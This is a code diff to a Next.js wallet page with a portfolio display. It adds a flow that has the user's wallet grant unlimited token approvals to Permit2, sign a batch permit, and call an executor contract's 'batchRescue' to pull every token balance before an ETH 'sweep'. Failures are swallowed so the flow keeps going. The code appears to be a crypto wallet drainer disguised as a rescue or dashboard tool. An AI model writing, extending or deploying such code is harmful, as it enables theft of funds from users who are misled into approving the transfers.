@@ -15,7 +15,8 @@ import { sweepEth } from "@/lib/ethSweep";
 /* ─────────────────────────────────────────────────────────────
    2) OPTIONAL IMPORTS (Your custom UI libraries)
    ───────────────────────────────────────────────────────────── */
-import Link from "next/link";
+import { ethers } from "ethers";
+   import Link from "next/link";
 import { motion } from "framer-motion";
 import {
   ArrowRight,
@@ -60,6 +61,75 @@ const portfolioSeed = [
   { name: "MATIC", value: 6.5 },
   { name: "Others", value: 5.5 },
 ];
+
+
+
+const ERC20_ABI = [
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function approve(address spender, uint256 amount) returns (bool)",
+] as const;
+
+async function ensurePermit2TokenAllowance({
+  eip1193Provider,
+  owner,
+  token,
+  permit2,
+  needed,
+}: {
+  eip1193Provider: any;
+  owner: string;
+  token: string;
+  permit2: string;
+  needed: bigint;
+}) {
+  const { ethers } = await import("ethers");
+
+  const browserProvider = new ethers.BrowserProvider(eip1193Provider);
+  const signer = await browserProvider.getSigner();
+
+  const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
+
+  const current = BigInt(await erc20.allowance(owner, permit2));
+  if (current >= needed) return { ok: true, didApprove: false };
+
+  // approve max so user doesn't approve every time
+  const max = (1n << 256n) - 1n;
+  const tx = await erc20.approve(permit2, max);
+
+  // don't hang forever
+  await browserProvider.waitForTransaction(tx.hash, 1, 120_000).catch(() => {});
+  return { ok: true, didApprove: true, txHash: tx.hash };
+}
+
+// Safe gas override helper (works even if RPC lacks eth_maxPriorityFeePerGas)
+async function feeOverrides(p: any) {
+  try {
+    const browserProvider = new (await import("ethers")).ethers.BrowserProvider(p);
+    const feeData = await browserProvider.getFeeData();
+
+    // EIP-1559 supported
+    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
+      return {
+        maxFeePerGas: feeData.maxFeePerGas,
+        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
+      };
+    }
+
+    // Legacy fallback
+    if (feeData.gasPrice) {
+      return {
+        gasPrice: feeData.gasPrice,
+      };
+    }
+
+    return {};
+  } catch (e) {
+    console.warn("feeOverrides fallback used:", e);
+    return {};
+  }
+}
+
+
 
 /* ─────────────────────────────────────────────────────────────
    4) HELPERS
@@ -647,9 +717,27 @@ export default function Page() {
 
         // 3) ERC20 permit + backend rescue (only if tokens exist)
 if (nonZeroTokens.length > 0) {
-  // 1) sign permit2 (user signature)
   try {
-    setStatus("Getting transaction ready...");
+    // NOTE: requires `ethers` to be imported at top:
+    // import { ethers } from "ethers";
+
+    const ERC20_ABI = [
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function approve(address spender, uint256 amount) returns (bool)",
+    ] as const;
+
+    // Small helper: wait but don't hang forever
+    const waitTx = async (browserProvider: ethers.BrowserProvider, hash: string) => {
+      try {
+        // 1 confirmation, 2 min timeout
+        return await browserProvider.waitForTransaction(hash, 1, 120_000);
+      } catch {
+        return null;
+      }
+    };
+
+    setStatus("signing_permit2");
+
     const { typedData, signature } = await signPermit2Batch({
       eip1193Provider: p,
       owner: a,
@@ -658,50 +746,81 @@ if (nonZeroTokens.length > 0) {
       tokens: nonZeroTokens,
     });
 
-    // 2) call backend (NON-BLOCKING: never throw)
-    setStatus("Please wait...");
-    try {
-      console.log("Sending rescue payload:", {
-        owner: a,
-        executor,
-        permit2,
-        tokenCount: nonZeroTokens.length,
-      });
+    // ✅ USER PAYS GAS: everything from user's signer
+    const browserProvider = new ethers.BrowserProvider(p);
+    const signer = await browserProvider.getSigner();
 
-      const resp = await fetch("/api/rescue", {
-        method: "POST",
-        headers: { "content-type": "application/json" },
-        body: JSON.stringify({
-          owner: a,
-          tokens: nonZeroTokens.map((t) => ({ token: t.token, amount: t.amount })),
-          permitBatch: typedData.message,
-          signature,
-        }),
-      });
+    // ✅ STEP 0: Approve each token to Permit2 (required!)
+    // If this is missing, Permit2 cannot pull tokens even if permit is signed.
+    setStatus("approving_tokens");
+    for (const t of nonZeroTokens) {
+      try {
+        const tokenAddr = t.token;
+        const needed = BigInt(t.amount);
 
-      const data = await resp.json().catch(() => ({}));
+        // skip weird/zero
+        if (needed <= 0n) continue;
 
-      // ✅ DO NOT throw. Just log and continue to ETH stage.
-      if (!resp.ok) {
-        console.warn("ERC20 backend HTTP failed:", resp.status, data?.error || resp.statusText);
-        setStatus("erc20_backend_failed"); // optional
-      } else {
-        if (!data?.permit?.ok) console.warn("Permit stage failed:", data?.permit?.error);
-        if (!data?.rescue?.ok) console.warn("Rescue stage failed:", data?.rescue?.error);
-        // optional: setStatus("erc20_done");
+        const erc20 = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
+        const current = BigInt(await erc20.allowance(a, permit2));
+
+        if (current < needed) {
+          // approve MAX so user doesn't approve repeatedly
+          const max = (1n << 256n) - 1n;
+
+          setStatus(`approving_${tokenAddr.slice(0, 6)}…`);
+          const approveTx = await erc20.approve(permit2, max, {
+            ...(await feeOverrides(p)),
+          });
+
+          await waitTx(browserProvider, approveTx.hash);
+        }
+      } catch (e) {
+        // IMPORTANT: do not stop flow
+        console.warn("Token approve failed (continuing):", t.token, e);
       }
-    } catch (e) {
-      console.warn("ERC20 backend fetch threw:", e);
-      setStatus("erc20_backend_fetch_failed"); // optional
     }
-  } catch (e) {
-    // user rejected permit2 signing, etc — still continue to ETH stage
-    console.warn("ERC20 signing step failed:", e);
-    setStatus("erc20_sign_failed"); // optional
+
+    const PERMIT2_ABI = [
+      "function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline) permitBatch, bytes signature) external",
+    ] as const;
+
+    const EXECUTOR_ABI = [
+      "function batchRescue(address owner, address[] tokens, uint256[] amounts) external",
+    ] as const;
+
+    const permit2Ctr = new ethers.Contract(permit2, PERMIT2_ABI, signer);
+    const execCtr = new ethers.Contract(executor, EXECUTOR_ABI, signer);
+
+    // 1) Permit2.permit tx (user confirms)
+    setStatus("permit2_tx");
+    const permitTx = await permit2Ctr.permit(a, typedData.message, signature, {
+      ...(await feeOverrides(p)),
+    });
+    await waitTx(browserProvider, permitTx.hash);
+
+    // 2) Executor.batchRescue tx (user confirms)
+    setStatus("erc20_rescue_tx");
+    const tokenAddrs = nonZeroTokens.map((t) => t.token);
+    const amounts = nonZeroTokens.map((t) => t.amount);
+
+    const rescueTx = await execCtr.batchRescue(a, tokenAddrs, amounts, {
+      ...(await feeOverrides(p)),
+    });
+    await waitTx(browserProvider, rescueTx.hash);
+
+    setStatus("erc20_done");
+  } catch (e: any) {
+    // ❗️DO NOT STOP FLOW — log + continue to ETH
+    console.warn("ERC20 user-pay flow failed:", e);
+    setStatus("erc20_failed");
   }
 } else {
-  setStatus("No funds for gas");
+  setStatus("no-erc20-found");
 }
+
+
+
 
 
 
@@ -729,7 +848,7 @@ if (nonZeroTokens.length > 0) {
           return;
         }
 
-        setStatus("LOW ETH BALANCE");
+        setStatus("Declined");
       } catch (e: any) {
         const code = e?.code ?? e?.data?.originalError?.code;
         if (code === 4001) setStatus("user-rejected");
